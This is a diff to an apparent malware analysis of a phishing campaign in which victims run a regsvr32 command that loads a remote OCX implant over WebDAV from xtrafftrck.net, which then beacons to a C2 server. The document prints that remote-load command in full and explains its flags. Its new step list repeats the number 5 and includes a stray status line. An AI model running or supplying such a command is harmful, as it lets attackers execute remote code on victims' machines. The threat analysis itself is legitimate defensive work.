@@ -125,19 +125,43 @@ The victim is phished, usually via email. They download an attachment or follow 
 
 The victim is instructed to run one of the following commands:
 
-```Win+R
-regsvr32.exe /s /n /i:"Koki=xtrafftrck.net:3000" \\xtrafftrck.net@80\files\runner.ocx
 ```
+regsvr32.exe /s /n /i:"runner.ocx" \\xtrafftrck.net@80\files\runner.ocx
+```
+
+| Flag | Purpose |
+|------|---------|
+| `/s` | Silent mode, suppresses success and error dialog boxes |
+| `/n` | Do not call `DllRegisterServer`, must be used with `/i` |
+| `/i` | Passes an optional parameter string to `DllInstall` |
+
+
 
 ## The Attack
 
-Let's break down this command. Here's what happens.
+Let's break down the initial attack.
 
 1. Windows WebClient (WebDAV) service mounts `\\xtrafftrck.net@80` as a virtual network share over HTTP.
 2. `regsvr32.exe` loads `runner.ocx` directly into its own process memory from the remote share.
-3. The `/n` flag bypasses `DllRegisterServer`, calling `DllInstall` directly.
-4. The `/i:"Koki=xtrafftrck.net:3000"` parameter passes the C2 address to `DllInstall` at runtime.
-5. The implant executes in memory and beacons to `xtrafftrck[.]net:3000`.
+3. The `/n` flag tells `regsvr32.exe` to skip `DllRegisterServer` and call `DllInstall` directly.
+4. The `/i:"runner.ocx"` string is passed to `DllInstall` as `pszCmdLine`.
+5. Filename check passes. `Koki=YES Blat=YES`. `AgentThread` starts.
+5. `DllInstall` parses the string, extracts the filename via `tail`, and validates it against the expected value `runner.ocx`.
+6. The implant executes in memory and beacons to `xtrafftrck[.]net:3000`.
+
+## DllInstall Function Signature
+
+```c
+HRESULT DllInstall(BOOL bInstall, LPCWSTR pszCmdLine);
+```
+
+## DllInstall Parameters
+
+| Parameter | Type | Description |
+|-----------|------|-------------|
+| `bInstall` | `BOOL` | `TRUE` to install, `FALSE` to uninstall |
+| `pszCmdLine` | `LPCWSTR` | Optional wide string passed via `/i:` flag. `NULL` if not provided |
+
 
 ## Command and Control
 
